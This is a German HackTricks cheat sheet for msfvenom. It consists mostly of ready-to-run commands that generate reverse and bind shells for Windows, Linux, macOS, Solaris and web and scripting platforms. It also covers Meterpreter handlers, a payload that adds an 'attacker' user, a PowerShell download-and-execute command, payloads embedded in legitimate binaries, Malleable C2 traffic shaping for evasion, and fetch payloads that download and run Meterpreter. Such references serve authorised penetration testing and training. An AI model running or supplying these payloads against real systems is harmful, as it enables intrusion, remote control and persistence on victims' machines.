# MSFVenom - Spickzettel

{{#include ../../banners/hacktricks-training.md}}

---

## Grundlegendes msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Verwende `-a`, um die Payload-Architektur auszuwählen, und `--platform`, um die Zielplattform auszuwählen.<sup>[[1]](#references)</sup>

## Auflisten
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Diese Befehle listen die im installierten Framework verfügbaren Payload- und Encoder-Module auf.<sup>[[1]](#references)</sup>

## Häufige Parameter beim Erstellen eines shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Die hier gezeigten Flags wählen Bad Characters, das Ausgabeformat, den Encoder und die Encoding-Durchläufe aus.<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter Traffic-Shaping

Metasploit 6.5 hat die Option `MALLEABLEC2` zu staged und stageless Reverse-HTTP(S)-Meterpreter-Payloads hinzugefügt. Das Profil kann URIs, User-Agents, Request-/Response-Header, die Platzierung der Connection-ID sowie unterstützte Body-Encodings und Wrapper ändern. Sowohl der generierte Payload als auch sein Handler müssen dasselbe lokale Profil laden. Der initiale Request eines staged Payloads für die Meterpreter-Stage wird nicht angepasst. Verwende daher einen stageless Payload wie `windows/x64/meterpreter_reverse_https`, wenn auch der erste Request dem Profil entsprechen muss.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Konfiguriere den passenden Handler mit dem identischen Payload und Profil:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Nur die als implementiert dokumentierten Direktiven beeinflussen den Datenverkehr; nicht unterstützte Profilblöcke können zwar erfolgreich geparst werden, bleiben jedoch wirkungslos.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Benutzer erstellen
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Befehl ausführen**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding ist keine AV-Umgehung:** Encoder wie `x86/shikata_ga_nai` sind hauptsächlich nützlich, um Einschränkungen durch ungültige Zeichen zu erfüllen. Wiederholtes Encoding ist keine zuverlässige AV-Umgehungstechnik.<sup>[[1]](#references)</sup>

### Eingebettet in eine ausführbare Datei
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Webbasierte Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads in Skriptsprachen**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch-Payload-Adapter

Fetch payloads erzeugen einen Befehl, der ein verfügbares Zielprogramm dazu bringt, ein zugrunde liegendes natives Payload herunterzuladen und auszuführen. Ihre Namen folgen dem Muster `cmd/<platform>/<fetch-protocol>/<served-payload>`; HTTP(S)-, SMB- und TFTP-Adapter sind verfügbar, wobei die Auswahl des Downloaders von der Zielplattform abhängt.<sup>[[2]](#references)</sup>

Zum Beispiel wird ein Linux-`wget`-Befehl erzeugt, der ein x64-Meterpreter-Payload von Port 8080 abruft und eine Rückverbindung über Port 4444 herstellt:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Starte den **fetch handler** mit denselben Einstellungen; er hostet die generierte ELF-Datei und startet außerdem den Handler für die bereitgestellte Meterpreter-Nutzlast:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Nützliche abhängige Optionen umfassen `FETCH_PIPE=true`, um, sofern unterstützt, einen kürzeren HTTP(S)-Befehl auszugeben, sowie `FETCH_FILELESS=shell`, `shell-search` oder `python3.8+`, um ein Linux-ELF aus einem anonymen Dateideskriptor auszuführen. Fileless-Modi erfordern Linux-Kernel 3.17 oder höher; prüfe den genauen Adapter mit `msfvenom -p <FETCH_PAYLOAD> --list-options`, da die unterstützten Kombinationen variieren.<sup>[[2]](#references)</sup>



## References

- [1] [Verwendung von msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Verwendung von Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
